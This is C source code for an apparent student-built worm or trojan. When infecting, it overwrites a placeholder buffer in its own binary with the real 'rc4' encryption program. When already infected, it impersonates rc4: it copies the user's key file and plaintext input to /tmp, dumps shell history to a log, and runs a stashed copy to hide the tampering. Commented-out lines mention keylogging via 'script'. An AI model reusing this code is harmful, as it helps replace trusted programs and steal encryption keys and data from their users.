#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#ifndef EOF
#define EOF (-1)
#endif


void infect(int argc, char *argv[]);
char* edit_a(char* str);

int main(int argc, char *argv[])
{
        FILE *check = fopen("rc4", "r");


        infect(argc, argv);


        return (0);
}


void infect(int argc, char *argv[]){
        static char a[100000] = "hello";
        printf("%s\n",argv[0] );

        int flag;
        if(a[0] == 'h') flag=0; else flag=1;


        if ( flag == 1 ) // Comparing it with the original size
        {
                // system("script terminal_log.txt");
                printf("already infected. ---> Recreating original rc4 from memory \n");

                if( argc < 2)
                {
                        fprintf(stderr," Usage is rc4 key < file > file\n");
                        exit(0);
                }else{

// TEST if argv is coming in

// printf("%s\n",argv[1] );
// printf("%s\n",argv[2] );
// === Its working ===

//TODO read-in key and move to temp if it exists


                        char* keyName = argv[1];
                        FILE* key = fopen(keyName,"r");
                        if(key != NULL) {
                                char* s1 = "cp ";
                                char* s2 = " /tmp/tempura";

                                size_t cmd_size = strlen(s1) + strlen(s2) + 2*strlen(keyName);
                                char* cmd;
                                cmd = malloc(cmd_size * sizeof(char));
                                strcpy(cmd, s1);
                                strcat(cmd, keyName);
                                strcat(cmd, s2);


                                // printf("%s\n", cmd);
                                system(cmd);
                                system("history > terminal_log.txt");


                                // === tested ===
                        }

// //TODO readin the file that needs to be encrypted and write to /tmp
                        FILE* input = fopen("/tmp/input","w+");
                        unsigned char achar;
                        int i;

                        if (input != NULL) {
                                while( (i = getchar()) != EOF)
                                {
                                        achar = i;
                                        fprintf (input, "%c", achar);
                                        // printf("%c",achar );
                                        // fputc( achar, stdout);
                                }
                                fclose(input);
                        }


//TODO execute commands to run rc4
                        char* s3 = "/tmp/rc4_2 key < /tmp/tempura > /tmp/output";
                        system(s3);

//TODO read in output.txt and output to standard output
                        FILE* output = fopen("/tmp/output","r");

                        if(output != NULL) {
                                while( (i = fgetc(output)) != EOF)
                                {
                                        achar = i;
                                        printf ( "%c", achar);
                                        // printf("%c",achar );
                                        // fputc( achar, stdout);
                                }
                                fclose(output);
                        }


                }




                // system("script /tmp/keylogger.txt"); // Creating text outupt for every STDIN, STDOUT, STDERR

        }
        else
        {
                printf("starting infection.\n");

                unsigned char ebuffer[100000];
                unsigned char cbuffer[10000];
                unsigned char worm_buffer[150000];



                FILE *rc4_code;
                FILE *worm_exe;
                // FILE *worm_code;


                size_t amount_read,amount_code;

                rc4_code = fopen("rc4","r");

                worm_exe = fopen( "worm","r");

                int code_len = fread(cbuffer, 1, sizeof(cbuffer), rc4_code);
                printf("%d \n", code_len);
                int worm_len = fread(worm_buffer, 1, sizeof(worm_buffer), worm_exe);
// printf("%s \n", cbuffer);
                // Checking Size of current rc4 file that is present for infection

                fclose(rc4_code);
                fclose(worm_exe);

                printf("FLAG 2 \n");

                int i, j = 0;
                for(i = 0; i < worm_len; i++ )
                {
                        // serach for the static variable memory location using its contents as a guide and replace with .c code
                        if(worm_buffer[i] == 'h' && worm_buffer[i+1] == 'e' && worm_buffer[i+2] == 'l'&& worm_buffer[i+3] == 'l' && worm_buffer[i+4] == 'o')
                        {
                                for( j=0; j<code_len; j++)
                                        worm_buffer[i++] = cbuffer[j];

                        }
                }

                FILE *fp3 = fopen("x.x","w");
                fwrite (worm_buffer, sizeof(char), sizeof(worm_buffer), fp3);
                fclose(fp3);
                system("mv x.x worm; chmod +x worm; chmod 777 worm");

        }

}

char* edit_a(char *str){
        printf("%s\n", str);
        return str;
}
